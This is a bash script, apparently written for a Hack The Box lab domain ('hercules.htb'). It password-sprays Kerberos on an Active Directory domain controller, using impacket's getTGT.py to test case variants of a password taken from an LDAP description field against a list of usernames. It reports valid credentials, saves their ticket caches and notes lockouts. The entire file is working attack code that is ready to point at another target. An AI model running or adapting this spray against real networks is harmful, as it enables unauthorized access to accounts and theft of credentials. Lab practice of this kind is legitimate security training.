#!/bin/bash
# The extracted description is case-blind (LDAP equality ignores case).
# A password like this is almost certainly titles-case: "Change*Th1s_P@ssw()rd!!"
DC=10.129.242.196
GT=/usr/share/doc/python3-impacket/examples/getTGT.py
USERS="johnathan.j auditor will.s mark.s ashley.b heather.s stephen.m patrick.s jennifer.a zeke.s tish.c admin administrator"

PWS=(
  'Change*Th1s_p@ssw()rd!!'
  'change*Th1s_p@ssw()rd!!'
  'Change*th1s_p@ssw()rd!!'
  'Change*Th1s_P@ssw()rd!!'
  'CHANGE*TH1S_P@SSW()RD!!'
  'Th1s_p@ssw()rd!!'
  'Change*Th1s_p@ssw0rd!!'
  'Change*Th1s_p@ssword!!'
)

for pw in "${PWS[@]}"; do
  echo "=== '$pw' ==="
  for u in $USERS; do
    out=$(python3 "$GT" "hercules.htb/$u:$pw" -dc-ip $DC 2>&1)
    if echo "$out" | grep -qiE 'Saving ticket|Got TGT'; then
      echo "  [VALID] $u : $pw"
      [ -f "$u.ccache" ] && cp "$u.ccache" "/home/kali/hercules/$u.ccache"
    elif echo "$out" | grep -qiE 'locked|disabled'; then
      echo "  [!] $u: $(echo "$out" | tail -1)"
    fi
    sleep 0.3
  done
done
echo "=== spray finished ==="
